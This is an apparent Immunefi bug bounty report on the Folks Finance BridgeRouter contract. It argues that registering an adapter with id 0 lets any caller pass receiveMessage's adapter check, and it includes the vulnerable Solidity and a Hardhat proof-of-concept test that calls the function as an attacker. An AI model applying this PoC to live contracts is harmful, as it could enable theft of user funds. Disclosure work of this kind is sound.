# Boost \_ Folks Finance 33589 - \[Smart Contract - Medium] Anyone can call the BridgeRouter Recieve fun

Submitted on Wed Jul 24 2024 02:38:16 GMT-0400 (Atlantic Standard Time) by @gizzy for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33589

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0x0f91d914E058d0588Cc1bf35FA3736A627C3Ba81>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Anyone can call the BridgeRouter Recieve function with malicious data to transfer funds. But this is only viable when theres an adapterID that is 0 which according to the test file had zero as an adapterID( <https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/test/bridge/BridgeRouterSpoke.test.ts#L41C2-L44C62> ). This gives the possibility of having an adapterID with zero as id.

## Vulnerability Details

There are two mapping updated when adding adapter which is idToAdapter and adapterToId . In a case that there is an adapter whose id is 0 then idToAdapter of 0 will be mapping to an address . in the recieve function of bridge router

```solidity
    function receiveMessage(Messages.MessageReceived memory message) external payable override {
        // check if caller is valid adapter
        IBridgeAdapter adapter = IBridgeAdapter(msg.sender);
        uint16 adapterId = adapterToId[adapter];
        if (!isAdapterInitialized(adapterId)) revert AdapterUnknown(adapter);

        // check if haven't seen message
        if (seenMessages[adapterId][message.messageId]) revert MessageAlreadySeen(message.messageId);

        // convert handler to address type (from lower 20 bytes)
        address handler = Messages.convertGenericAddressToEVMAddress(message.handler);

        // add msg.value to user balance if present
        if (msg.value > 0) {
            bytes32 userId = _getUserId(Messages.decodeActionPayload(message.payload));
            balances[userId] += msg.value;
        }

        // store message as seen before call to handler
        seenMessages[adapterId][message.messageId] = true;

        // call handler with received payload
        try BridgeMessenger(handler).receiveMessage(message) {
            // emit message received as suceeded
            emit MessageSucceeded(adapterId, message.messageId);
        } catch (bytes memory err) {
            // don't revert so GMP doesn't revert
            // store and emit message received as failed
            failedMessages[adapterId][message.messageId] = message;
            emit MessageFailed(adapterId, message.messageId, err);
        }
    }
```

which anyone can call it makes sure that the msg.sender is an adapter by checking if adapterToId of the msg.sender will return a valid id. but since all invalid msg.sender will return 0 as id and 0 is already mapped to the a valid address it will pass and go on . this will lead to the attacker being the provide of malicious data . This can be critical if it really happen on mainnet as it can transfer protocol funds to the attacker. pointing it out because it is implemented on the test file so it possible on mainnet.

## Impact Details

This could lead to loss of funds and i would suggest 0 id should revert if one tries to add it as adapterid

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/test/bridge/BridgeRouterSpoke.test.ts#L41C2-L44C62>

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/bridge/BridgeRouter.sol#L96C5-L98C77>

## Proof of concept

## Proof of Concept

Run `npx hardhat test test/bridge/BridgeRouterSpoke.test.ts --grep "Should successfuly call the router Recieve function"`

```javascript
import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import {
  BridgeRouterSpokeExposed__factory,
  BridgeRouterSpoke__factory,
  BridgeMessengerReceiver__factory,
  MockAdapter__factory,
} from "../../typechain-types";
import {
  BYTES32_LENGTH,
  convertEVMAddressToGenericAddress,
  convertStringToBytes,
  getAccountIdBytes,
  getEmptyBytes,
  getRandomAddress,
  getRandomBytes
} from "../utils/bytes";
import { MessagePayload,MessageReceived,buildMessagePayload } from "../utils/messages/messages";
import { SECONDS_IN_DAY } from "../utils/time";
import { bigint } from "hardhat/internal/core/params/argumentTypes";

describe("BridgeRouter (unit tests)", () => {
  const DEFAULT_ADMIN_ROLE = getEmptyBytes(BYTES32_LENGTH);
  const MANAGER_ROLE = ethers.keccak256(convertStringToBytes("MANAGER"));

  const accountId: string = getAccountIdBytes("ACCOUNT_ID");

  async function deployBridgeRouterFixture() {
    const [admin, user, ...unusedUsers] = await ethers.getSigners();

    // deploy contract
    const bridgeRouter = await new BridgeRouterSpoke__factory(admin).deploy(admin.address);
    const bridgeRouterExposed = await new BridgeRouterSpokeExposed__factory(admin).deploy(admin.address);
    const bridgeRouterAddress = await bridgeRouter.getAddress();

    const bridgeMessenger = await new BridgeMessengerReceiver__factory(admin).deploy(bridgeRouter);

    // common params
    const bridgeMessengerAddress = await bridgeMessenger.getAddress();

    return { admin, user, unusedUsers, bridgeRouter, bridgeRouterExposed, bridgeRouterAddress,bridgeMessengerAddress };
  }

  async function fundUserIdFixture() {
    const { admin, user, unusedUsers, bridgeRouter, bridgeRouterAddress } =
      await loadFixture(deployBridgeRouterFixture);
    // deploy and add adapter
    const adapter = await new MockAdapter__factory(admin).deploy(bridgeRouterAddress);
    const adapterId = 0;
    const adapterAddress = await adapter.getAddress();
    await bridgeRouter.addAdapter(adapterId, adapterAddress);

    // setup balance
    const userId = convertEVMAddressToGenericAddress(user.address);
    const startingBalance = BigInt(5000000);
    await bridgeRouter.increaseBalance(userId, { value: startingBalance });
    expect(await bridgeRouter.balances(userId)).to.be.equal(startingBalance);

    return {
      admin,
      user,
      unusedUsers,
      bridgeRouter,
      bridgeRouterAddress,
      startingBalance,
      userId,
    };
  }

  async function fundUserIdFixtureBigEth() {
    const { admin, user, unusedUsers, bridgeRouter, bridgeRouterAddress,bridgeMessengerAddress } =
      await loadFixture(deployBridgeRouterFixture);
    // deploy and add adapter
    const adapter = await new MockAdapter__factory(admin).deploy(bridgeRouterAddress);
    const adapterId = 0;
    const adapterAddress = await adapter.getAddress();
    await bridgeRouter.addAdapter(adapterId, adapterAddress);

    // setup balance
    const userId = convertEVMAddressToGenericAddress(user.address);
    const startingBalance = BigInt(5e18);
    await bridgeRouter.increaseBalance(userId, { value: startingBalance });
    expect(await bridgeRouter.balances(userId)).to.be.equal(startingBalance);

    return {
      admin,
      user,
      unusedUsers,
      bridgeRouter,
      bridgeRouterAddress,
      startingBalance,
      userId,
      bridgeMessengerAddress
    };
  }





  describe ("Anyone can call the router Recieve function",() => {

    it("Should successfuly  call the router Recieve function", async () => {
      const { user, bridgeRouter,unusedUsers, startingBalance, userId,bridgeMessengerAddress } = await loadFixture(fundUserIdFixtureBigEth);

     const attacker = unusedUsers[12];
     console.log("signer",unusedUsers[12].address);

    

      
      const message: MessageReceived = {
        messageId: getRandomBytes(BYTES32_LENGTH),
        sourceChainId: BigInt(0),
        sourceAddress: convertEVMAddressToGenericAddress(unusedUsers[0].address),
        handler: convertEVMAddressToGenericAddress(bridgeMessengerAddress),
        payload: buildMessagePayload(0, accountId, attacker.address, "0x"),
        returnAdapterId: BigInt(0),
        returnGasLimit: BigInt(0),
      };


      // directly call bridgeRouter 
     const steal = await bridgeRouter.connect(attacker).receiveMessage(message); 
      const receipt = await ethers.provider.getTransactionReceipt(steal.hash);


    });
  })
});
```
